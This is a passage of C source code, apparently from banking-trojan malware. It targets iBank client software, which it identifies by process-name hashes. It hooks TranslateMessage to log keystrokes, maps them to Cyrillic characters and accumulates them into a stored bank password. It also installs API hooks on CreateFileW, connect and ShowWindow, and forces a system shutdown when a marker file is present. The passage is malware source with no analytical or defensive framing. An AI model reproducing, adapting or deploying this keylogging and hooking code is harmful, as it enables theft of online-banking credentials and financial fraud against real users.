					Symbol[0] = 'с';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 68 )
				{
					Symbol[0] = 'в';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 69 )
				{
					Symbol[0] = 'у';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 70 )
				{
					Symbol[0] = 'а';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 71 )
				{
					Symbol[0] = 'п';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 72 )
				{
					Symbol[0] = 'р';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 73 )
				{
					Symbol[0] = 'ш';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 74 )
				{
					Symbol[0] = 'о';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 75 )
				{
					Symbol[0] = 'л';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 76 )
				{
					Symbol[0] = 'д';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 77 )
				{
					Symbol[0] = 'ь';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 78 )
				{
					Symbol[0] = 'т';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 79 )
				{
					Symbol[0] = 'щ';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 80 )
				{
					Symbol[0] = 'з';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 81 )
				{
					Symbol[0] = 'й';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 82 )
				{
					Symbol[0] = 'к';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 83 )
				{
					Symbol[0] = 'ы';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 84 )
				{
					Symbol[0] = 'е';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 85 )
				{
					Symbol[0] = 'г';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 86 )
				{
					Symbol[0] = 'м';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 87 )
				{
					Symbol[0] = 'ц';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 88 )
				{
					Symbol[0] = 'ч';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 89 )
				{
					Symbol[0] = 'н';
					Symbol[1] = '\0';
				}
				else if ( lpMsg->wParam == 90 )
				{
					Symbol[0] = 'я';
					Symbol[1] = '\0';
				}		
			}
		}
		else if ( lpMsg->message == 0x0101 )
		{
			if ( lpMsg->wParam == 16 )
			{
				if ( dwLastLayout == dwKeyLayout )
				{
					SHIFT_FLAG = false;
				}
			}
		}

		if ( dwLastLayout != dwKeyLayout )
		{
			dwLastLayout = dwKeyLayout;
		}

		if ( m_lstrlen( Symbol ) )
		{
			if ( m_lstrlen( Symbol ) == 1 )
			{
				BYTE OutSymbol = Symbol[0];
				TranslateSymbol( dwKeyLayout, Symbol[0], &OutSymbol );

				Symbol[0] = OutSymbol;
				Symbol[1] = '\0';
			}

			if ( pIbank->Password == NULL )
			{
				if ( ( pIbank->Password = (char*)MemAlloc( m_lstrlen( Symbol ) + 1 ) ) == NULL )
				{
					return;
				}
			}
			else
			{
				char *p = (char*)MemRealloc( pIbank->Password, m_lstrlen( pIbank->Password ) + m_lstrlen( Symbol ) + 1 );

				if ( p == NULL )
				{
					return;
				}

				pIbank->Password = p;
			}

			m_memcpy( pIbank->Password + m_lstrlen( pIbank->Password ), Symbol, m_lstrlen( Symbol ) );
		}
	}
		
	return;
}


BOOL WINAPI Hook_IbankTranslateMessage( const MSG *lpMsg )
{

	DWORD dwCurrentMenu = GetCurrentMenuType();

	PIBANK pCurrent = NULL;

	if ( dwCurrentMenu == ENTER_SYSTEM_MENU ) //вход в систему
	{
		dwCurrentMenu = ENTER_SYSTEM_MENU;
	}
	else if ( dwCurrentMenu == SYNCHRONIZATION_WITH_BANK )
	{
		dwCurrentMenu = SYNCHRONIZATION_WITH_BANK;
	}

	if ( pIbank != NULL && lpMsg != NULL )
	{
		if (  pIbank->WindowName == NULL )
		{
			char *CurrentWindow = GetCurrentWindow();

			if ( CurrentWindow != NULL )
			{
				if ( ( pIbank->WindowName = (char*)MemAlloc( m_lstrlen( CurrentWindow ) + 1 ) ) != NULL )
				{
					m_memcpy( pIbank->WindowName, CurrentWindow, m_lstrlen( CurrentWindow ) );
				}
			}

			MemFree( CurrentWindow );
		}

		ParseKeys( lpMsg, dwCurrentMenu );
	}

	return Real_IbankTranslateMessage ( lpMsg );
}


bool IsIbank()
{
	WCHAR *ModulePath = (WCHAR*)MemAlloc( MAX_PATH );

	if ( ModulePath == NULL )
	{
		return false;
	}

	pGetModuleFileNameW( NULL, ModulePath, MAX_PATH );
	DWORD dwProcessHash = GetNameHash( ModulePath );

	MemFree( ModulePath );

	if ( dwProcessHash == 0x150CFBD3 || dwProcessHash == 0x1F1AA76A )
	{
		return true;
	}

	return false;
}




bool IbankHooks()
{
	if ( !IsIbank() )
	{
		return false;
	}

	WCHAR FullPath[ MAX_PATH ];
	WCHAR * tmp= GetShellFoldersKey( 2 );
	plstrcpyW( FullPath, tmp );
	MemFree(tmp);
	plstrcatW( FullPath, L"\\" );
	plstrcatW( FullPath, L"usernt_init.dat" );

	if ( (DWORD)pGetFileAttributesW( FullPath ) != -1 )
	{
		MakeShutdown();
		pExitProcess( 1 );
	}

	pIbank = (PIBANK)MemAlloc( sizeof( IBANK ) );

	if ( !pIbank )
	{
		return false;
	}

	m_memset( pIbank, 0, sizeof( IBANK ) );

	InitScreenLib();
    
	UnhookIBancShowCreate();
	UnhookTranslateMessage();
	UnhookCreateFileW();
	
	if ( HookApi( 1, 0x8F8F102, (DWORD)&Hook_CreateFileW ) )
	{
		__asm mov [Real_CreateFileW], eax
	}	


	if ( HookApi( 3, 0xC45D9631, (DWORD)&Hook_IbankTranslateMessage ) )
	{
		__asm mov [Real_IbankTranslateMessage], eax
	}

	if ( HookApi( 4, 0xEDD8FE8A, (DWORD)&Hook_Connect ) )
	{
		__asm mov [Real_Connect], eax
	}	
	if ( HookApi( 3, 0x7506E960, (DWORD)&Hook_ShowWindow1 ) )
	{  
		__asm mov [Real_ShowWindow1], eax			
	}

	return true;
}
//#endif